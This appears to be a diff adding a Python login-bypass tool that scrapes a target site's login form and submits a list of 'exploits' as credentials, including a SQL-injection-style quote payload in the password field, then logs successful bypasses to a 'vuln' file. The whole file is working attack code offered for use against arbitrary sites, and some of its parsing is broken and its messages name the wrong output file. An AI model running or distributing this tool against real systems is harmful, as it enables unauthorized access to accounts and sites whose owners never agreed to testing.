@@ -1,0 +1,96 @@
+import requests
+import re
+
+def get_post_url(ng, site):
+    """Extracts the post URL from the HTML response."""
+    posturl_matches = re.findall(r"post\('[^']*'|POST\('[^']*'|action=\"[^\"]*\"", ng)
+    posturl = ""
+    if posturl_matches:
+        posturl = sorted(set([re.sub(r"action=\"|post\('|'\"", '', u) for u in posturl_matches]))[0]
+    if "action=\"http" in ng:
+        post = re.search(r'action="([^"]*)"', ng).group(1)
+    else:
+        # Determine base post URL structure
+        if re.search(r"\.", site.split("/")[-1]):
+            tmp = site.split("/")[-1]
+            post = site.replace(tmp, "")
+        else:
+            post = f"{'/'.join(site.split('/')[:2])}{posturl}"
+    return post
+
+
+def extract_form_values(ng):
+    """Extracts form input fields and their current values."""
+    value_matches = re.findall(r'(<input).*?(>)', ng)
+    values = []
+    for match in value_matches:
+        name_value = re.findall(r'name="([^"]*)" value="([^"]*)"', match[1])
+        if name_value:
+            values.extend(name_value)
+    return "&".join([f"{name}={val}" for name, val in values])
+
+
+def attempt_login(post, postdata):
+    """Attempts to log in by sending a POST request."""
+    try:
+        response = requests.post(post, data=postdata)
+        return response.text
+    except requests.RequestException as e:
+        print(f"[ERROR] Request failed: {e}")
+        return None
+
+
+def bypass(target, exploits):
+    """Attempts login bypass using a list of exploits."""
+    sukses = ""
+    print(f"\n[*] Starting {target}")
+
+    site = target.replace("http://", "").replace("https://", "")
+    try:
+        ng = requests.get(f"http://{site}").text
+    except requests.RequestException as e:
+        print(f"[ERROR] Failed to retrieve the page: {e}")
+        return
+
+    post = get_post_url(ng, site)
+    value = extract_form_values(ng)
+
+    # Get form parameters (limit to 2 parameters for simplicity)
+    param_matches = sorted(set(re.findall(r'name="([^"]*)', ng)))
+    param1 = param_matches[0] if param_matches else ""
+    param2 = param_matches[1] if len(param_matches) > 1 else ""
+
+    for xploit in exploits:
+        print(f"[INFO] Trying login with: {xploit}")
+
+        # Prepare POST data
+        if "@gmail" in xploit:
+            postdata = f"{param1}={xploit}&{param2}=''or{value}"
+        else:
+            postdata = f"{param1}={xploit}&{param2}={xploit}{value}"
+
+        response_text = attempt_login(post, postdata)
+
+        # Check for common login failure error messages
+        if response_text and re.search(r"(User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|wrong|Invalid|error)", response_text):
+            print(f"[INFO] Login failed with: {xploit}")
+            print(f"Post data: {post} -d {postdata}\n")
+        else:
+            if xploit == "test" or not xploit:
+                print("[INFO] Failed to get login\n")
+                break
+            success_message = f"\n+++++++++++++++++++++!!![ login success ]!!!+++++++++++++++++++++\nSite: {target} \nLogin: {xploit}"
+            print(f"{success_message}\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+            with open("vuln.txt", "a") as f:
+                f.write(f"{success_message}\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
+            print(f"\a[INFO] Login successful\nSite: {target}\nLogin: {xploit}\nSaved: vuln-bypass.txt\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
+            break
+    else:
+        print("[INFO] All exploits failed.")
+
+
+# Example usage:
+if __name__ == "__main__":
+    target = "http://example.com"
+    exploits = ["user1@gmail.com", "user2@gmail.com", "test"]
+    bypass(target, exploits)
